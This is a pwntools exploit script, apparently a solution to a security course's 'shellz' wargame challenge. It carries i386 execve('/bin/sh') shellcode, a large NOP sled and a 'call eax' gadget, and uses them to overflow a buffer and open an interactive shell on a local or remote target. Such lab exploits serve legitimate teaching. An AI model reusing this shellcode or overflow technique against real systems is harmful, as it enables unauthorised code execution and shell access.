#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './shellz' #Change this

PROGNAME = exe
REMOTE = "comp6447.wtf" #Change this
REMOTEPORT = 15901 #Change this
global p
global e
global global_timeout

e = ELF(PROGNAME)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

if args.REMOTE:
    global_timeout = 3
    p = remote(REMOTE, REMOTEPORT)
else:
    global_timeout = 0.5
    p = process(PROGNAME)
    p = start()
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# Here is a random stack address: ... (randomised)
p.recvuntil(b'random stack address: ', drop=True)
stackaddr = p.recvline()
log.info(f"The random stack address is {stackaddr}")

my_assembly ="""
xor ecx, ecx
mul ecx

mov eax, 0xb
push 0x68
push 0x732f2f2f
push 0x6e69622f
mov ebx, esp
int 0x80
"""
shellcode1 = asm(my_assembly)
nopsled = """
nop
"""
shellcode2 = asm(nopsled)

call_eax = p32(0x08049019)

shellcode = shellcode1 + shellcode2 * (8192 + 8 - len(shellcode1))

p.sendline(shellcode + call_eax)
# pause()
p.interactive()

